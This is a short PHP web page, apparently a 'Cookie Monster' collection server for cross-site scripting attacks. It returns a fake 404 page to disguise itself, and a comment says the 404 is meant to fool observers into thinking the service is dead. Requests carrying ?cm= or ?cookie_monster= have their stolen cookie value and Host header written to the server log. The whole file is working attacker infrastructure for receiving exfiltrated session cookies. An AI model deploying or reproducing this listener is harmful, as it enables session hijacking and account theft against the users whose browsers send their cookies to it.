<!DOCTYPE html>
<html>

<head>
  <title>Friendzone.com</title>
</head>

<body>
  <?php
  http_response_code(404); //Always return 404 (as if to fools someone into thinking the service is dead/errored

  // Colors
  $GREEN = "\033[32m";
  $RED = "\033[31m";
  $BLUE = "\033[34m";
  $CYAN = "\033[36m";
  $WHITE = "\033[97m";
  $YELLOW = "\033[93m";
  $RESET = "\033[0m";

  // http://IP:PORT/?cookie_monster= or http://IP:PORT/?cm= 

  if (preg_match('/\?(cm|cookie_monster)\=/', $_SERVER["REQUEST_URI"])) {

    $output = parse_url($_SERVER["REQUEST_URI"], PHP_URL_QUERY);
    $cookie = explode("=", $output, 2);

    ob_start();

    error_log("");
    error_log($CYAN . "Cookie Monster Server" . $RESET);
    error_log($YELLOW . "Request recieved." . $RESET);
    error_log($GREEN . "Host: " . $WHITE . $_SERVER["HTTP_HOST"] . $RESET);
    error_log($GREEN . "Cookie: " . $WHITE . end($cookie) . $RESET);
    error_log("");

    ob_end_clean();
    return false;
  } else {
  ?>
    <h1>404, Page Not found</h1>
  <?php
  }
  ?>
</body>

</html>
